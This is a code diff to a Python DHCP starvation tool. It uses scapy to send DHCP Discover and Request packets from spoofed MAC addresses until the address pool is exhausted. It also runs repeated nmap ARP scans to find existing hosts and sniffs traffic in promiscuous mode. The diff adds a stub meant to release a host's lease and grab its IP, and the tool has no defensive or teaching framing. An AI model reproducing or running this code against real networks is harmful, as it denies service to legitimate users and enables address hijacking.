@@ -3,6 +3,7 @@ import nmap
 import time
 #import json
 import threading
+import sched
 import netifaces
 import logging
 from logging.handlers import TimedRotatingFileHandler
@@ -14,6 +15,7 @@ import ipaddress
 from pyroute2 import IPRoute # Para el modo promiscuo
 from datetime import datetime
 #from pyroute2.netlink.exceptions import NetlinkError
+import sys
 
 
 # Interface to spoof
@@ -48,17 +50,17 @@ class fake_host:
         self.acquisition_time = None # Time when IP Address was obtained
     #def __str__(self):
     #    return f"IP: {self.ip_address}, MAC: {self.mac_address}, hostname: {self.hostname}"
-
+'''
 class existing_host:
-    '''
+    
     Defines basic parameters of an existing host
-    '''
+    
     def __init__(self):
         self.ip_address = None
         self.mac_address = None
         self.hostname = None
         self.transaction_id = None
-
+'''
 
 # Define a semaphore for .log/.json file access
 file_semaphore = threading.Semaphore()
@@ -155,14 +157,12 @@ def create_fake_host():
     return host
 
 
-def send_discover(fake_host):
+def send_discover(host):
     """
     Send a broadcast DHCP Discover with freshly created fake host's parameters
     """
-    # Creates a fake host
-    #fake_host = create_fake_host()
-    mac_address = fake_host.mac_address
-    trans_id = fake_host.transaction_id
+    mac_address = host.mac_address
+    trans_id = host.transaction_id
     # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
     host_mac = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
     # Making DHCP Discover packet
@@ -180,26 +180,21 @@ def send_discover(fake_host):
     dhcp_field = scapy.DHCP(options=[("message-type", "discover"),
                                      ("client_id", b'\x01' + host_mac),
                                      ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),  
-                                     ("hostname", fake_host.hostname), 
-                                     #("hostname", "elvispresley"), 
+                                     ("hostname", host.hostname), 
                                      "end"])
     dhcp_discover = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
 
-    #scapy.sendp(dhcp_discover, verbose=False, iface=interface)
     scapy.sendp(dhcp_discover, verbose=False, iface=iface)
     write_to_log(f"Sending DHCP Discover for MAC address {mac_address}")
 
 
-def send_request(mac_address, interface):
+def send_request(host):
     """
     Send a broadcast DHCP Request with requested IP address and spoofed mac address
     """
-    # Obtaining fake host's IP address and Transaction ID
-    ip_address = fake_host_dict[mac_address].ip_address
-    trans_id = fake_host_dict[mac_address].transaction_id
-    hostname = fake_host_dict[mac_address].hostname
+    trans_id = host.transaction_id
     # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
-    mac_address = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
+    mac_address = int(host.mac_address.replace(":", ""), 16).to_bytes(6, "big")
     # Making DHCP Request packet
     ether_header = scapy.Ether(src=mac_address, 
                                dst="ff:ff:ff:ff:ff:ff")
@@ -214,13 +209,13 @@ def send_request(mac_address, interface):
                                      ("client_id", b'\x01' + mac_address),
                                      ("server_id", dhcp_server_ip),
                                      ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),
-                                     ("requested_addr", ip_address), 
-                                     ("hostname", hostname),
+                                     ("requested_addr", host.ip_address), 
+                                     ("hostname", host.hostname),
                                      "end"])
     dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
 
-    scapy.sendp(dhcp_request, verbose=False, iface=interface)
-    #scapy.sendp(dhcp_request, verbose=False, iface=iface)
+    #scapy.sendp(dhcp_request, verbose=False, iface=interface)
+    scapy.sendp(dhcp_request, verbose=False, iface=iface)
 
 
 def send_renewal_request(host, interface):
@@ -327,7 +322,7 @@ def handle_dhcp_packet(packet):
     """
     Listens for received DHCP packets
     """
-    interface = packet.sniffed_on
+    #interface = packet.sniffed_on
     global fake_host_dict
 
     # Option 2: DHCP Offer (response to Discover)
@@ -345,18 +340,10 @@ def handle_dhcp_packet(packet):
         dhcp_opts = get_dhcp_options(packet)
         dhcp_server_ip = dhcp_opts["server_id"] 
         dhcp_server_mac = packet[scapy.Ether].src
-        '''
-        dhcp_server_ip = packet[scapy.BOOTP].siaddr
-        # If BOOTP in Unicast Mode, IP.src / IP.dst are DHCP Server / leased IP address to host
-        flag_broadcast = bool(packet[scapy.BOOTP].flags & 0x8000)
-        if not flag_broadcast:
-            dhcp_server_mac = packet[scapy.Ether].src
-        else:
-            # No idea how to obtain DHCP server's MAC on a broadcast DHCP Offer
-            pass
-        '''
+       
+        fake_host = fake_host_dict[host_mac]
         # Send DHCP Request
-        send_request(host_mac, interface)
+        send_request(fake_host)
         
     # Option 3: DHCP Request, sent when a device reconnects to network (on broadcast) 
     elif scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 3:
@@ -366,9 +353,9 @@ def handle_dhcp_packet(packet):
         # Obtaining DHCP Options
         dhcp_opts = get_dhcp_options(packet)
         # 
-        global existing_host_dict
+        # global existing_host_dict
         fake_macs = fake_host_dict.keys()
-        existing_macs = existing_host_dict.keys()
+        # existing_macs = existing_host_dict.keys()
         # Getting host's MAC address (sender)
         client_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
         '''
@@ -382,7 +369,7 @@ def handle_dhcp_packet(packet):
         # In received packet is not from any of ours fake hosts, in from a recently reconnected host
         if client_mac not in fake_macs:
             # If host doesn't exist on dictionary, we create it
-            host = existing_host()
+            host = fake_host()
             # Setting his params
             if dhcp_opts["requested_addr"]:
                 host.ip_address = dhcp_opts["requested_addr"]
@@ -413,9 +400,9 @@ def handle_dhcp_packet(packet):
         host_ip = packet[scapy.BOOTP].yiaddr
         # Check if packet is for us. Only captured if device is connected to a mirror port
         if not is_this_mac_ours(host_mac) or host_mac == our_mac_address:
-            write_to_log(f"Received unknown DHCP ACK: {host_ip} from {host_mac}")
+            write_to_log(f"Received unknown DHCP ACK: {host_ip} linked to {host_mac}")
             return None
-        
+    
         # Updating the fake host's attributes with final decision
         dhcp_opts_dict = get_dhcp_options(packet)
         fake_host_dict[host_mac].ip_address = host_ip
@@ -427,11 +414,10 @@ def handle_dhcp_packet(packet):
     elif scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 6:
         write_to_log(f"NAK received! :(")
         host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
-        # Check if packet is for us. If not, captured DHCP packet is from another host in the network
+        # Check if packet is for us
         if is_this_mac_ours(host_mac):
-            # Sending new DHCP Discover
-            global fake_host_dict
-            send_discover(fake_host_dict[fake_host])
+            # Starting again DHCP handshake. Sending new DHCP Discover
+            send_discover(fake_host_dict[host_mac])
         # Removing fake host
         # del fake_host_dict[host_mac]
 
@@ -577,32 +563,44 @@ def release_all_ips():
 
 def perform_arp_scan(network):
     '''
+    Perform ans ARP scan
+    '''
+    write_to_log(f"Starting ARP Request scan...")
+    ip_mac_data = arp_scan(network)
+    
+    for ip, mac in ip_mac_data:
+        write_to_log(f"ARP Scan: Found existing host {ip} - {mac}")
+        # Ignoring DHCP server
+        if ip != dhcp_server_ip:
+            None
+
+
+
+def arp_scan(network):
+    '''
     Performs an nmap ping and ARP scan to find existing hosts on the network
     '''
-    #nm = nmap.PortScanner("/home/pi/dhcp_starver/python_venv/lib/nmap")
     nm = nmap.PortScanner()
     try:
         nm.scan(hosts=network, arguments='-sP -PR')
         # For every found host creates a duple IP Address - MAC Address
         ip_mac_data = [(x, nm[x]['addresses']['mac']) for x in nm.all_hosts() if 'mac' in nm[x]['addresses']]
-        # Adds existing hosts to the dictionary
-        #global existing_host_dict
-        for ip, mac in ip_mac_data:
-            write_to_log(f"ARP Scan: Found existing host {ip} - {mac}")
-            # Ignoring DHCP server
-            if ip != dhcp_server_ip:
-                None
-
-
+        return ip_mac_data
     except Exception as e:
         write_to_log(f"Error during scan: {e}")
+        return None
+    
 
-
+def release_and_request():
+    '''
+    Sends a DHCP Release and then DHCP Request to catch that IP address
+    '''
+    None
 
 def main():
     global iface
     iface = "eth0"
-    write_to_log(f"Starting service on interface {iface}...")
+    write_to_log(f"Starting service on interface {iface}")
 
     # Getting interface parameters
     global our_ip_address, our_mac_address, our_netmask, our_network
@@ -636,23 +634,39 @@ def main():
     # Removing all fake hosts with no IP address linked due to pool exhaustion
     clean_unused_fake_hosts()
   
-    # Calculates network based on IP address
-    #network = '.'.join(our_ip_address.split('.')[:-1]) + '.0/24'
     # Performs an ARP scan to find all hosts connected to network
-    arp_scan_thread = threading.Thread(target=perform_arp_scan, args=(our_network,))
-    arp_scan_thread.start()
+    time_between_arp_scans = 600 # seconds
+    # Setting scheduler
+    arp_scan_scheduler = sched.scheduler(time.time, time.sleep)
+    arp_scan_scheduler.enter(delay=time_between_arp_scans, priority=1, action=perform_arp_scan, argument=(our_network,))
+    # Creating thread
+    arp_scan_thread = threading.Thread(target=arp_scan_scheduler.run)
+    
+    
     #perform_arp_scan(our_network)
 
 
     # Infinite loop to do IP release renewal on every fake host when necessary
     time_interval_to_check_if_ip_renewal_is_necessary = 60 # seconds
     try:
+        # First ARP Scan, then the scheduler performs it every t seconds in a separated thread
+        perform_arp_scan(our_network)
+        arp_scan_thread.start()
         ip_lease_renewal(time_interval_to_check_if_ip_renewal_is_necessary)
     except Exception as e:
         # If an exception occurs (p.e. KeyboardInterrupt) all IP's will be released
-        print(e)
+        #print(e)
+        #with contextlib.suppress():
+        #    pass
+        sys.exit(0)
         #print(f"Program exception ocurred (KeyboardInterrupt?), releasing all IP addresses")
     finally:
+        # Stop ARP scan thread
+        #write_to_log("Stopping ARP scan thread...")
+        #arp_scan_scheduler.cancel(event=arp_scan_thread)
+        #arp_scan_thread.join()
+        #stop_event.set()
+        #arp_scan_thread.join()
         # Releasing all IP addresses
         release_all_ips()
         # Disabling promiscuous mode
